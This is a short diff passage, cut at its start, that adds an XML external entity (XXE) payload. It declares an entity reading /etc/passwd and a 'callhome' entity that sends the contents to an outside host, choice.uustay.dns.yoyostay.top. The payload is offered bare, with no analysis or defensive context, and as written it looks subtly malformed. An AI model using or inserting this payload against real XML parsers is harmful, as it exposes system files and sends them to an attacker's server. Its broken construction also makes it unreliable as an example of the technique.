@@ -1,0 +1,7 @@
+CTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "http://choice.uustay.dns.yoyostay.top/?%xxe;">
+]
+>
+<foo>&callhome;</foo>
